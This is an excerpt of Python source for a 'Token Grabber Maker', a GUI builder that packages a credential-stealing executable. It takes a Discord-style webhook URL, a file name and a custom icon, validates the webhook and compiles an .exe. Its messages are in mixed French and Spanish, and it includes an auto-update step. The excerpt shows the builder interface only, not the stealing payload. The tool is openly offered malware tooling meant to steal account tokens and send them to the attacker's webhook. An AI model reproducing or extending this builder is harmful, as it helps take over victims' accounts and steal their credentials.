...
def build():
    ...
    ctypes.windll.kernel32.SetConsoleTitleW(f"Token Grabber Maker | Version {version.text} | JamaicanoExcel#1843")
    if version.text != "1.0.8\n":
        print("Une nouvelle version est disponible, le téléchargement est en cours.")
        ctypes.windll.kernel32.SetConsoleTitleW(f"Token Grabber Maker | Mise à jour en cours... | JamaicanoExcel#1843")
        ...
        ctypes.windll.kernel32.SetConsoleTitleW("Token Grabber Maker | Mise à jour terminée | JamaicanoExcel#1843")
    ...
    print("""
     ...
     |__   __|  | |               / ____|         | |   | |               |  \/  |     | |            
        ...
        |_|\___/|_|\_\___|_| |_|  \_____|_|  \__,_|_.__/|_.__/ \___|_|    |_|  |_|\__,_|_|\_\___|_|   by JamaicanoExcel#1843
                                                                                                                                                                                     
    """)
    layout = [
        [sg.Text('Webhook', size=(15, 1)), sg.Input(size=(40, 1), key="webhook")],
        [sg.Text('Name File', size=(15, 1)), sg.Input(size=(40, 1), key="name")],
        [sg.Text('Icon', size=(15, 1)), sg.InputText(size=(40, 1), key="iconpath"), sg.FileBrowse(button_text="Elejir", file_types=(("Icon Files", "*.ico"),("All Files", "*.*")), size=(6,1), key="iconbrowse")],
        [sg.Button("Armar EXE", size=(10, 1))]
    ]
    window = sg.Window("Token Grabber Maker by JamaicanoExcel#1843", layout=layout)
    while True:
        event, value = window.read()
        if event in ("Exit", "Quit", None):
            break
        elif event == "Armar EXE":
            if not os.path.exists("Executable\\"):
                os.mkdir("Executable\\")
            if value["webhook"] == '':
                sg.PopupNonBlocking("Especifica un webhook !")
                continue
            elif value["name"] == '':
                sg.PopupNonBlocking("Especifica un nombre !")
                continue
            elif value['iconpath'] == '':
            ...
            if not check.status_code == 200:
                sg.PopupNonBlocking("La webhook es invalida!")
                continue
            print("El .exe se esta creando paciencia...")
